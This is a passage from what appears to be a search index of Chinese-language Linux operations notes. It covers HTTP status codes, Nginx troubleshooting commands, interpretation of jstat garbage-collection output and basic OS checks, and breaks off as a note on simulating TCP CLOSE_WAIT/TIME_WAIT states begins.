\u68c0\u67e5\u670d\u52a1\u5668\u7aef\u7684\u91cd\u5b9a\u5411\u8bbe\u7f6e\u3002\u5982\u679c\u662f\u610f\u6599\u4e4b\u5916\u7684\u91cd\u5b9a\u5411\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u914d\u7f6e\u6216\u4ee3\u7801\u4e2d\u7684\u91cd\u5b9a\u5411\u903b\u8f91\u3002 303 See Other (\u67e5\u770b\u5176\u4ed6\u4f4d\u7f6e) 304 Not Modified (\u672a\u4fee\u6539) \u8fd9\u901a\u5e38\u662f\u6b63\u5e38\u7684\uff0c\u8868\u793a\u8d44\u6e90\u81ea\u4e0a\u6b21\u8bf7\u6c42\u4ee5\u6765\u672a\u4fee\u6539\u3002\u68c0\u67e5\u7f13\u5b58\u8bbe\u7f6e\u3002 307 Temporary Redirect (\u4e34\u65f6\u91cd\u5b9a\u5411) 308 Permanent Redirect (\u6c38\u4e45\u91cd\u5b9a\u5411) 4xx - \u5ba2\u6237\u7aef\u9519\u8bef\u72b6\u6001\u7801 (Client Error) \uff1a\u8868\u793a\u8bf7\u6c42\u5305\u542b\u8bed\u6cd5\u9519\u8bef\u6216\u65e0\u6cd5\u5b8c\u6210\u3002 400 Bad Request (\u9519\u8bef\u8bf7\u6c42) \u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6b63\u786e\u3002\u901a\u5e38\u662f\u8bf7\u6c42\u683c\u5f0f\u9519\u8bef\u3002 401 Unauthorized (\u672a\u6388\u6743) \u68c0\u67e5\u8ba4\u8bc1\u4fe1\u606f\u662f\u5426\u6b63\u786e\u3002 403 Forbidden (\u7981\u6b62) \u786e\u8ba4\u670d\u52a1\u5668\u7aef\u6743\u9650\u8bbe\u7f6e\u3002 404 Not Found (\u672a\u627e\u5230) \u68c0\u67e5\u8bf7\u6c42\u7684\u8d44\u6e90\u662f\u5426\u5b58\u5728\u3002 405 Method Not Allowed (\u65b9\u6cd5\u4e0d\u5141\u8bb8) \u786e\u8ba4\u662f\u5426\u4f7f\u7528\u4e86\u670d\u52a1\u5668\u4e0d\u652f\u6301\u7684HTTP\u65b9\u6cd5\u3002 408 Request Timeout (\u8bf7\u6c42\u8d85\u65f6) \u68c0\u67e5\u7f51\u7edc\u95ee\u9898\u6216\u670d\u52a1\u5668\u6027\u80fd\u95ee\u9898\u3002 429 Too Many Requests (\u8bf7\u6c42\u8fc7\u591a) \u68c0\u67e5\u662f\u5426\u89e6\u53d1\u4e86\u670d\u52a1\u5668\u7684\u9650\u6d41\u63aa\u65bd\uff0c\u5982\u6709\u9700\u8981\u8c03\u6574\u8bf7\u6c42\u9891\u7387\u3002 5xx - \u670d\u52a1\u5668\u9519\u8bef\u72b6\u6001\u7801 (Server Error) \uff1a\u8868\u793a\u670d\u52a1\u5668\u5728\u5904\u7406\u8bf7\u6c42\u7684\u65f6\u5019\u53d1\u751f\u4e86\u9519\u8bef\u3002 500 Internal Server Error (\u670d\u52a1\u5668\u5185\u90e8\u9519\u8bef) \u68c0\u67e5\u670d\u52a1\u5668\u65e5\u5fd7\uff0c\u786e\u8ba4\u4ee3\u7801\u3001\u6570\u636e\u5e93\u3001\u6216\u914d\u7f6e\u4e2d\u7684\u95ee\u9898\u3002 501 Not Implemented (\u672a\u5b9e\u73b0) \u670d\u52a1\u5668\u4e0d\u652f\u6301\u8bf7\u6c42\u7684\u529f\u80fd\u3002 502 Bad Gateway (\u9519\u8bef\u7f51\u5173) \u68c0\u67e5\u670d\u52a1\u5668\u4e0e\u4e0a\u6e38\u670d\u52a1\u5668\u7684\u8fde\u63a5\u3002 503 Service Unavailable (\u670d\u52a1\u4e0d\u53ef\u7528) \u670d\u52a1\u5668\u53ef\u80fd\u8d85\u8f7d\u6216\u8fdb\u884c\u7ef4\u62a4\u3002\u68c0\u67e5\u670d\u52a1\u5668\u6027\u80fd\u548c\u914d\u7f6e\u3002 504 Gateway Timeout (\u7f51\u5173\u8d85\u65f6) \u7c7b\u4f3c\u4e8e502\uff0c\u68c0\u67e5\u670d\u52a1\u5668\u4e0e\u4e0a\u6e38\u670d\u52a1\u5668\u7684\u8fde\u63a5\u95ee\u9898\u3002 \u8fd9\u4e9b\u72b6\u6001\u7801\u662fWeb\u5f00\u53d1\u548c\u7f51\u7edc\u8bca\u65ad\u4e2d\u7684\u91cd\u8981\u90e8\u5206\u3002","title":"\u7b2c\u4e8c\u6b65"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%8E%92%E6%9F%A5%E7%BD%91%E9%A1%B5%E6%89%93%E4%B8%8D%E5%BC%80/#_4","text":"3,\u68c0\u67e5\u7f51\u9875\u670d\u52a1\u5668\u72b6\u6001\uff0c\u4f8b\u5982Nginx\uff0cApache\u7b49 \u4f8b\u5982\u68c0\u67e5Nginx\u670d\u52a1\u5668\u662f\u5426\u6b63\u5e38\u8fd0\u884c\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u8fdb\u884c\uff1a \u68c0\u67e5Nginx\u670d\u52a1\u72b6\u6001 \uff1a \u5728\u547d\u4ee4\u884c\u8f93\u5165 `sudo systemctl status nginx` \u6216 `service nginx status` \uff08\u53d6\u51b3\u4e8e\u4f60\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u670d\u52a1\u7ba1\u7406\u5668\uff09\u3002\u8fd9\u4f1a\u663e\u793aNginx\u7684\u8fd0\u884c\u72b6\u6001\u3002 \u68c0\u67e5\u7aef\u53e3\u76d1\u542c \uff1a \u4f7f\u7528 `netstat -tulpn | grep nginx` \u6216 `ss -tulpn | grep nginx` \u6765\u786e\u8ba4Nginx\u662f\u5426\u6b63\u5728\u76d1\u542c\u6b63\u786e\u7684\u7aef\u53e3\uff08\u901a\u5e38\u662f80\u548c443\u7aef\u53e3\uff09\u3002 \u8bbf\u95ee\u7f51\u7ad9 \uff1a \u5c1d\u8bd5\u5728nginx\u670d\u52a1\u5668\u4e2d\u8f93\u5165\u4f60\u7684\u670d\u52a1\u5668IP\u6216\u7ed1\u5b9a\u7684\u57df\u540d\uff0c\u770b\u662f\u5426\u80fd\u6210\u529f\u52a0\u8f7d\u7f51\u9875\u3002 \u6216\u8005\u5728nginx\u670d\u52a1\u5668\u4e0acurl\u547d\u4ee4\u8bbf\u95ee127.0.0.1+\u7aef\u53e3\uff0c\u770b\u662f\u5426\u80fd\u6210\u529f\u52a0\u8f7d\u7f51\u9875 \u67e5\u770bNginx\u9519\u8bef\u65e5\u5fd7 \uff1a Nginx\u7684\u9519\u8bef\u65e5\u5fd7\u901a\u5e38\u4f4d\u4e8e `/var/log/nginx/error.log`\u3002 \u67e5\u770b\u8be5\u6587\u4ef6\u53ef\u80fd\u4f1a\u7ed9\u51fa\u4e00\u4e9b\u4e3a\u4ec0\u4e48Nginx\u65e0\u6cd5\u6b63\u5e38\u8fd0\u884c\u7684\u7ebf\u7d22\u3002 \u68c0\u67e5Nginx\u914d\u7f6e\u6587\u4ef6 \uff1a \u4f7f\u7528 `nginx -t` \u547d\u4ee4\u6765\u6d4b\u8bd5Nginx\u914d\u7f6e\u6587\u4ef6\u662f\u5426\u6709\u8bed\u6cd5\u9519\u8bef\u3002 \u6216\u8005\u4f7f\u7528 ps auxww | grep [\u8fdb\u7a0b\u53f7] \u67e5\u770bNginx\u542f\u52a8\u547d\u4ee4\u662f\u5426\u6307\u5b9a\u4e86\u914d\u7f6e\u6587\u4ef6 \u68c0\u67e5\u7cfb\u7edf\u8d44\u6e90 \uff1a \u4f7f\u7528 `top` \u6216 `htop` \u7b49\u547d\u4ee4\u6765\u68c0\u67e5\u670d\u52a1\u5668\u7684 CPU\u548c\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\uff0c\u786e\u4fdd\u7cfb\u7edf\u8d44\u6e90\u6ca1\u6709\u88ab\u8017\u5c3d\u3002 \u4e00\u6837\u7684\u9053\u7406\u53ef\u4ee5\u68c0\u67e5Apache\u3002","title":"\u7b2c\u4e09\u6b65"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%8E%92%E6%9F%A5%E7%BD%91%E9%A1%B5%E6%89%93%E4%B8%8D%E5%BC%80/#_5","text":"4,\u68c0\u67e5\u5f00\u53d1\u73af\u5883\u72b6\u6001\uff0c\u4f8b\u5982Java\uff0cPython\uff0cPHP\u7b49 \u4f8b\u5982\u68c0\u67e5Java\uff1a jstat -gc [pid] \u547d\u4ee4\u63d0\u4f9b\u4e86Java\u5806\u5185\u5b58\u4e2d\u5bf9\u8c61\u7684\u5783\u573e\u6536\u96c6\u548c\u5806\u4f7f\u7528\u60c5\u51b5\u7684\u4fe1\u606f\u3002\u8f93\u51fa\u7684\u6bcf\u5217\u6570\u636e\u4ee3\u8868\u4e0d\u540c\u7684\u5185\u5b58\u533a\u57df\u6216\u7edf\u8ba1\u4fe1\u606f\u3002\u4ee5\u4e0b\u662f\u5178\u578b\u8f93\u51fa\u7684\u5217\u548c\u5b83\u4eec\u7684\u542b\u4e49\uff1a 1. S0C: Survivor space 0 capacity (KB) - \u5e78\u5b58\u533a0\u7684\u5bb9\u91cf\u3002 2. S1C: Survivor space 1 capacity (KB) - \u5e78\u5b58\u533a1\u7684\u5bb9\u91cf\u3002 3. S0U: Survivor space 0 utilization (KB) - \u5e78\u5b58\u533a0\u7684\u4f7f\u7528\u91cf\u3002 4. S1U: Survivor space 1 utilization (KB) - \u5e78\u5b58\u533a1\u7684\u4f7f\u7528\u91cf\u3002 5. EC: Eden space capacity (KB) - \u4f0a\u7538\u56ed\u533a\u7684\u5bb9\u91cf\u3002 6. EU: Eden space utilization (KB) - \u4f0a\u7538\u56ed\u533a\u7684\u4f7f\u7528\u91cf\u3002 7. OC: Old space capacity (KB) - \u8001\u5e74\u4ee3\u533a\u7684\u5bb9\u91cf\u3002 8. OU: Old space utilization (KB) - \u8001\u5e74\u4ee3\u533a\u7684\u4f7f\u7528\u91cf\u3002 9. MC: Metaspace capacity (KB) - \u5143\u7a7a\u95f4\u7684\u5bb9\u91cf\u3002 10. MU: Metaspace utilization (KB) - \u5143\u7a7a\u95f4\u7684\u4f7f\u7528\u91cf\u3002 11. CCSC: Compressed Class Space Capacity (KB) - \u538b\u7f29\u7c7b\u7a7a\u95f4\u7684\u5bb9\u91cf\u3002 12. CCSU: Compressed Class Space Used (KB) - \u538b\u7f29\u7c7b\u7a7a\u95f4\u7684\u4f7f\u7528\u91cf\u3002 13. YGC: Number of young generation GC events - \u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u53d1\u751f\u7684\u6b21\u6570\u3002 14. YGCT: Young generation garbage collection time - \u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u6240\u7528\u7684\u65f6\u95f4\u3002 15. FGC: Number of full GC events - \u5b8c\u5168\u5783\u573e\u6536\u96c6\u53d1\u751f\u7684\u6b21\u6570\u3002 16. FGCT: Full garbage collection time - \u5b8c\u5168\u5783\u573e\u6536\u96c6\u6240\u7528\u7684\u65f6\u95f4\u3002 17. GCT: Total garbage collection time - \u5783\u573e\u6536\u96c6\u6240\u7528\u7684\u603b\u65f6\u95f4\u3002 \u901a\u8fc7\u5206\u6790\u8fd9\u4e9b\u6570\u636e\uff0c\u4f60\u53ef\u4ee5\u83b7\u5f97JVM\u5806\u5185\u5b58\u4f7f\u7528\u60c5\u51b5\u548c\u5783\u573e\u6536\u96c6\u6d3b\u52a8\u7684\u8be6\u7ec6\u89c6\u56fe\u3002\u8fd9\u5bf9\u4e8e\u6027\u80fd\u8c03\u4f18\u548c\u8bca\u65ad\u5185\u5b58\u95ee\u9898\u662f\u975e\u5e38\u6709\u5e2e\u52a9\u7684\u3002 \u6709\u4e00\u4e9b\u901a\u7528\u7684\u6307\u6807\u53ef\u4ee5\u6307\u793a\u6f5c\u5728\u7684\u95ee\u9898\uff1a \u9891\u7e41\u7684\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6 (YGC) \uff1a Note \u5982\u679c YGC \u6570\u503c\u4e0d\u65ad\u5feb\u901f\u589e\u52a0\uff0c\u53ef\u80fd\u8868\u660e\u5e74\u8f7b\u4ee3\u7a7a\u95f4\u592a\u5c0f\u6216\u8005\u7a0b\u5e8f\u5728\u77ed\u65f6\u95f4\u5185\u751f\u6210\u4e86\u5927\u91cf\u7684\u4e34\u65f6\u5bf9\u8c61\u3002 \u957f\u65f6\u95f4\u7684\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6 (YGCT) \uff1a Note \u5982\u679c\u5355\u6b21 YGCT \u503c\u8f83\u9ad8\uff0c\u8bf4\u660e\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u82b1\u8d39\u4e86\u592a\u591a\u65f6\u95f4\uff0c\u53ef\u80fd\u662f\u7531\u4e8e\u5806\u5927\u5c0f\u4e0d\u8db3\u6216\u5783\u573e\u6536\u96c6\u5668\u8bbe\u7f6e\u4e0d\u5408\u7406\u3002 \u9891\u7e41\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6 (FGC) \uff1a Note FGC \u9891\u7e41\u589e\u52a0\u53ef\u80fd\u8868\u660e\u8001\u5e74\u4ee3\u6216\u6c38\u4e45\u4ee3/\u5143\u7a7a\u95f4\uff08\u53d6\u51b3\u4e8eJava\u7248\u672c\uff09\u5bb9\u91cf\u4e0d\u8db3\uff0c\u6216\u8005\u6709\u5927\u91cf\u5bf9\u8c61\u957f\u671f\u5b58\u6d3b\u3002 \u957f\u65f6\u95f4\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6 (FGCT) \uff1a Note \u9ad8 FGCT \u503c\u8868\u793a\u5b8c\u5168\u5783\u573e\u6536\u96c6\u5360\u7528\u4e86\u592a\u591a\u65f6\u95f4\uff0c\u53ef\u80fd\u662f\u7531\u4e8e\u8001\u5e74\u4ee3\u7a7a\u95f4\u592a\u5c0f\u3001\u5b58\u5728\u5927\u91cf\u957f\u751f\u547d\u5468\u671f\u7684\u5bf9\u8c61\uff0c\u6216\u5783\u573e\u6536\u96c6\u5668\u8bbe\u7f6e\u4e0d\u5f53\u3002 \u9ad8\u8001\u5e74\u4ee3\u4f7f\u7528\u91cf (OU) \uff1a Note \u5982\u679c OU \u503c\u6301\u7eed\u63a5\u8fd1 OC \u503c\uff0c\u8868\u660e\u8001\u5e74\u4ee3\u7a7a\u95f4\u63a5\u8fd1\u6ee1\u8f7d\uff0c\u53ef\u80fd\u5bfc\u81f4\u9891\u7e41\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6\u3002 \u9ad8\u5143\u7a7a\u95f4\u4f7f\u7528\u91cf (MU) \uff1a Note MU \u63a5\u8fd1 MC \u8868\u660e\u5143\u7a7a\u95f4\u4f7f\u7528\u91cf\u9ad8\uff0c\u53ef\u80fd\u7531\u4e8e\u52a0\u8f7d\u4e86\u5927\u91cf\u7c7b\u6216\u5185\u5b58\u6cc4\u6f0f\u3002 \u603b\u5783\u573e\u6536\u96c6\u65f6\u95f4 (GCT) \uff1a Note \u5982\u679c GCT \u76f8\u5bf9\u4e8e\u5e94\u7528\u8fd0\u884c\u65f6\u95f4\u8fc7\u9ad8\uff0c\u8868\u660e\u5e94\u7528\u82b1\u8d39\u4e86\u5927\u91cf\u65f6\u95f4\u5728\u5783\u573e\u6536\u96c6\u4e0a\u3002 \u8bc6\u522b\u8fd9\u4e9b\u5f02\u5e38\u60c5\u51b5\u540e\uff0c\u53ef\u80fd\u9700\u8981\u5bf9JVM\u7684\u5806\u5927\u5c0f\u3001\u5783\u573e\u6536\u96c6\u5668\u7c7b\u578b\u3001\u5783\u573e\u6536\u96c6\u7b56\u7565\u7b49\u8fdb\u884c\u8c03\u6574\uff0c\u6216\u8005\u68c0\u67e5\u5e94\u7528\u4ee3\u7801\u4ee5\u67e5\u627e\u5185\u5b58\u6cc4\u6f0f\u6216\u4e0d\u5fc5\u8981\u7684\u5bf9\u8c61\u521b\u5efa\u3002\u5bf9\u4e8e\u5177\u4f53\u7684\u8c03\u4f18\u7b56\u7565\uff0c\u9700\u8981\u6839\u636e\u5e94\u7528\u7a0b\u5e8f\u7684\u5177\u4f53\u60c5\u51b5\u548c\u9700\u6c42\u6765\u5b9a\u3002 jstat -gcutil <pid> <interval> <count> \u547d\u4ee4\u7528\u4e8e\u663e\u793a\u76ee\u6807Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\uff08GC\uff09\u7edf\u8ba1\u4fe1\u606f\uff0c\u5e76\u6309\u7167\u8bbe\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u91cd\u590d\u663e\u793a\u6307\u5b9a\u6b21\u6570\u3002\u4e0b\u9762\u662f\u8be5\u547d\u4ee4\u5404\u90e8\u5206\u7684\u89e3\u91ca\uff1a Note jstat \uff1aJava\u7684\u7edf\u8ba1\u76d1\u63a7\u5de5\u5177\u3002 -gcutil \uff1a\u8fd9\u662f jstat \u7684\u4e00\u4e2a\u9009\u9879\uff0c\u7528\u4e8e\u663e\u793a\u76ee\u6807Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\u7edf\u8ba1\u4fe1\u606f\uff0c\u5305\u62ec\u5806\u533a\u57df\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u7b49\u3002 <pid> \uff1a\u76ee\u6807Java\u8fdb\u7a0b\u7684\u8fdb\u7a0bID\u3002\u60a8\u9700\u8981\u66ff\u6362\u4e3a\u60a8\u60f3\u76d1\u63a7\u7684Java\u8fdb\u7a0b\u7684\u5b9e\u9645\u8fdb\u7a0bID\u3002 <interval> \uff1a\u663e\u793a\u4fe1\u606f\u7684\u65f6\u95f4\u95f4\u9694\uff0c\u5355\u4f4d\u4e3a\u6beb\u79d2\u3002\u8fd9\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53ea\u663e\u793a\u4e00\u6b21\u6570\u636e\u3002 <count> \uff1a\u8be5\u547d\u4ee4\u8981\u91cd\u590d\u6267\u884c\u7684\u6b21\u6570\u3002\u8fd9\u4e2a\u53c2\u6570\u4e5f\u662f\u53ef\u9009\u7684\uff0c\u5982\u679c\u672a\u6307\u5b9a\uff0c jstat \u5c06\u6301\u7eed\u663e\u793a\u6570\u636e\uff0c\u76f4\u5230\u88ab\u4e2d\u65ad\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u60a8\u60f3\u67e5\u770b\u8fdb\u7a0bID\u4e3a1234\u7684Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\u7edf\u8ba1\u4fe1\u606f\uff0c\u6bcf\u96945000\u6beb\u79d2\uff08\u53735\u79d2\uff09\u66f4\u65b0\u4e00\u6b21\uff0c\u603b\u5171\u66f4\u65b010\u6b21\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a jstat -gcutil 1234 5000 10 \u8fd9\u4e2a\u547d\u4ee4\u5c06\u6bcf5\u79d2\u663e\u793a\u4e00\u6b21\u8fdb\u7a0bID\u4e3a1234\u7684Java\u8fdb\u7a0b\u7684\u5783\u573e\u6536\u96c6\u7edf\u8ba1\u4fe1\u606f\uff0c\u5171\u663e\u793a10\u6b21\u3002 jstat -gcutil 1234 5000 10 \u8fd9\u4e2a\u547d\u4ee4\u7684\u8f93\u51fa\u5c06\u5c55\u793a\u8fdb\u7a0bID\u4e3a1234\u7684Java\u5e94\u7528\u7684\u5783\u573e\u6536\u96c6\uff08GC\uff09\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u6bcf5\u79d2\u5237\u65b0\u4e00\u6b21\uff0c\u5171\u5237\u65b010\u6b21\u3002\u6bcf\u6b21\u5237\u65b0\u5c06\u5c55\u793a\u7c7b\u4f3c\u4ee5\u4e0b\u7684\u6570\u636e\uff08\u5177\u4f53\u6570\u503c\u4f1a\u6839\u636e\u5e94\u7528\u72b6\u6001\u6709\u6240\u4e0d\u540c\uff09\uff1a S0 S1 E O M CCS YGC YGCT FGC FGCT GCT 0.00 0.00 76.85 40.07 97.69 95.83 118 1.472 2 0.234 1.706 0.00 0.00 80.37 41.07 97.69 95.83 118 1.472 2 0.234 1.706 ... \u8fd9\u91cc\u662f\u5404\u5217\u6570\u636e\u7684\u610f\u4e49\uff1a S0 \u548c S1 \uff1a\u5e78\u5b58\u533a\uff08Survivor spaces\uff090\u548c1\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 E \uff1a\u4f0a\u7538\u56ed\u533a\uff08Eden space\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 O \uff1a\u8001\u5e74\u4ee3\uff08Old generation\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 M \uff1a\u5143\u6570\u636e\u533a\uff08Metaspace\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 CCS \uff1a\u538b\u7f29\u7c7b\u7a7a\u95f4\uff08Compressed Class Space\uff09\u7684\u4f7f\u7528\u767e\u5206\u6bd4\u3002 YGC \uff1a\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\uff08Young Generation Garbage Collection\uff09\u53d1\u751f\u7684\u6b21\u6570\u3002 YGCT \uff1a\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u6240\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u79d2\uff09\u3002 FGC \uff1a\u5b8c\u5168\u5783\u573e\u6536\u96c6\uff08Full Garbage Collection\uff09\u53d1\u751f\u7684\u6b21\u6570\u3002 FGCT \uff1a\u5b8c\u5168\u5783\u573e\u6536\u96c6\u6240\u82b1\u8d39\u7684\u65f6\u95f4\uff08\u79d2\uff09\u3002 GCT \uff1a\u603b\u5783\u573e\u6536\u96c6\u65f6\u95f4\uff08\u79d2\uff09\u3002 \u8fd9\u4e9b\u6570\u636e\u5bf9\u4e8e\u7406\u89e3\u548c\u8c03\u4f18Java\u5e94\u7528\u7684\u5185\u5b58\u548c\u5783\u573e\u6536\u96c6\u884c\u4e3a\u975e\u5e38\u6709\u5e2e\u52a9\u3002 \u5982\u679cJava\u5e94\u7528\u51fa\u73b0\u5f02\u5e38\uff0c jstat -gcutil \u547d\u4ee4\u8f93\u51fa\u7684\u6570\u636e\u53ef\u80fd\u4f1a\u5c55\u793a\u4e00\u4e9b\u5f02\u5e38\u6a21\u5f0f\uff0c\u6bd4\u5982\uff1a \u9891\u7e41\u7684\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\uff08YGC\uff09 : \u8bf4\u660e\uff1a\u5982\u679cYGC\u53d1\u751f\u7684\u9891\u7387\u975e\u5e38\u9ad8\uff0c\u53ef\u80fd\u610f\u5473\u7740\u4f0a\u7538\u56ed\u533a\uff08Eden space\uff09\u592a\u5c0f\u6216\u8005\u5e94\u7528\u4ea7\u751f\u4e86\u5927\u91cf\u7684\u77ed\u751f\u547d\u5468\u671f\u5bf9\u8c61\u3002 \u4e3e\u4f8b\uff1a\u5982\u679c\u6bcf\u51e0\u79d2\u949f\u5c31\u6709\u4e00\u6b21YGC\uff0c\u4e14YGCT\uff08\u5e74\u8f7b\u4ee3\u5783\u573e\u6536\u96c6\u65f6\u95f4\uff09\u76f8\u5bf9\u8f83\u9ad8\uff0c\u53ef\u80fd\u8bf4\u660e\u5b58\u5728\u95ee\u9898\u3002 \u8001\u5e74\u4ee3\uff08Old Generation\uff09\u4f7f\u7528\u7387\u6301\u7eed\u589e\u9ad8 : \u8bf4\u660e\uff1a\u5982\u679c\u8001\u5e74\u4ee3\u7684\u4f7f\u7528\u7387\u4e0d\u65ad\u6500\u5347\u4e14\u4e0d\u4e0b\u964d\uff0c\u53ef\u80fd\u8868\u660e\u5185\u5b58\u6cc4\u6f0f\u6216\u8001\u5e74\u4ee3\u5927\u5c0f\u4e0d\u8db3\u3002 \u4e3e\u4f8b\uff1a\u5982\u679c\u8001\u5e74\u4ee3\u7684\u4f7f\u7528\u7387\uff08O\u5217\uff09\u9010\u6e10\u63a5\u8fd1100%\u4e14\u4e0d\u89c1\u4e0b\u964d\uff0c\u53ef\u80fd\u662f\u5185\u5b58\u6cc4\u6f0f\u7684\u8ff9\u8c61\u3002 \u9891\u7e41\u7684\u5b8c\u5168\u5783\u573e\u6536\u96c6\uff08FGC\uff09 : \u8bf4\u660e\uff1a\u9891\u7e41\u7684FGC\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7cfb\u7edf\u505c\u987f\uff0c\u5f71\u54cd\u6027\u80fd\u3002\u53ef\u80fd\u662f\u7531\u4e8e\u8001\u5e74\u4ee3\u7a7a\u95f4\u4e0d\u8db3\u6216\u5185\u5b58\u6cc4\u6f0f\u9020\u6210\u7684\u3002 \u4e3e\u4f8b\uff1a\u5982\u679cFGC\u7684\u6b21\u6570\uff08FGC\u5217\uff09\u5728\u77ed\u65f6\u95f4\u5185\u8fc5\u901f\u589e\u52a0\uff0c\u4e14FGCT\uff08\u5b8c\u5168\u5783\u573e\u6536\u96c6\u65f6\u95f4\uff09\u4e5f\u5728\u589e\u52a0\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u6027\u80fd\u95ee\u9898\u3002 \u5783\u573e\u6536\u96c6\u65f6\u95f4\u8fc7\u957f : \u8bf4\u660e\uff1a\u5982\u679c\u5783\u573e\u6536\u96c6\u6240\u9700\u7684\u65f6\u95f4\u8fc7\u957f\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u54cd\u5e94\u7f13\u6162\u6216\u505c\u987f\u3002 \u4e3e\u4f8b\uff1a\u5982\u679cYGCT\u6216FGCT\u7684\u503c\u5f02\u5e38\u9ad8\uff0c\u610f\u5473\u7740\u5783\u573e\u6536\u96c6\u5360\u7528\u4e86\u5927\u91cf\u65f6\u95f4\uff0c\u53ef\u80fd\u5bfc\u81f4\u5e94\u7528\u6027\u80fd\u4e0b\u964d\u3002 \u603b\u4e4b\uff0c\u901a\u8fc7\u76d1\u63a7 jstat -gcutil \u547d\u4ee4\u7684\u8f93\u51fa\uff0c\u53ef\u4ee5\u8bc6\u522b\u51fa\u6f5c\u5728\u7684\u5185\u5b58\u7ba1\u7406\u95ee\u9898\uff0c\u5982\u5185\u5b58\u6cc4\u6f0f\u3001\u4e0d\u6070\u5f53\u7684\u5783\u573e\u6536\u96c6\u7b56\u7565\u6216\u5185\u5b58\u5206\u914d\u4e0d\u8db3\u7b49\u3002\u7136\u540e\u53ef\u4ee5\u6839\u636e\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u884c\u8c03\u4f18\u6216\u8fdb\u4e00\u6b65\u8c03\u67e5\u3002","title":"\u7b2c\u56db\u6b65"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%8E%92%E6%9F%A5%E7%BD%91%E9%A1%B5%E6%89%93%E4%B8%8D%E5%BC%80/#_6","text":"5,\u68c0\u67e5\u64cd\u4f5c\u7cfb\u7edf \u68c0\u67e5\u9632\u706b\u5899\u8bbe\u7f6e \uff1a \u786e\u4fdd\u9632\u706b\u5899\u6ca1\u6709\u963b\u6b62Nginx\u4f7f\u7528\u7684\u7aef\u53e3\uff0c\u7279\u522b\u662fHTTP (80) \u548c HTTPS (443) \u7aef\u53e3\u3002 s 2. \u68c0\u67e5SELinux\u72b6\u6001 \uff08\u5982\u679c\u9002\u7528\uff09\uff1a \u5728\u67d0\u4e9bLinux\u53d1\u884c\u7248\u4e0a\uff0cSELinux\u53ef\u80fd\u4f1a\u9650\u5236Nginx\u7684\u64cd\u4f5c\u3002\u53ef\u4ee5\u901a\u8fc7 getenforce \u67e5\u770b\u5176\u72b6\u6001\uff0c\u5e76\u6839\u636e\u9700\u8981\u8fdb\u884c\u8c03\u6574\u3002 \u68c0\u67e5Nginx\u7684\u8bbf\u95ee\u65e5\u5fd7 \uff1a \u8bbf\u95ee\u65e5\u5fd7\u901a\u5e38\u4f4d\u4e8e /var/log/nginx/access.log \u3002\u5b83\u53ef\u4ee5\u63d0\u4f9b\u8bbf\u95ee\u8005\u8bf7\u6c42\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6709\u52a9\u4e8e\u8bc6\u522b\u6f5c\u5728\u95ee\u9898\u3002 \u67e5\u770b\u7cfb\u7edf\u65e5\u5fd7 \uff1a \u6709\u65f6\u7cfb\u7edf\u65e5\u5fd7\uff08\u5982 /var/log/syslog \u6216 /var/log/messages \uff09\u4e5f\u80fd\u63d0\u4f9b\u670d\u52a1\u5668\u95ee\u9898\u7684\u7ebf\u7d22\u3002 \u540e\u9762\u9047\u5230\u5177\u4f53\u573a\u666f\u518d\u5177\u4f53\u8865\u5145","title":"\u7b2c\u4e94\u6b65"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/%E6%A8%A1%E6%8B%9F%E4%B8%80%E6%AC%A1/","text":"Python \u6a21\u62df\u4e00\u4e2aCLOSE_WAIT TIME_WAIT\u72b6\u6001\u7684\u5b58\u5728\u6709\u4e24\u4e2a\u7406\u7531\uff1a 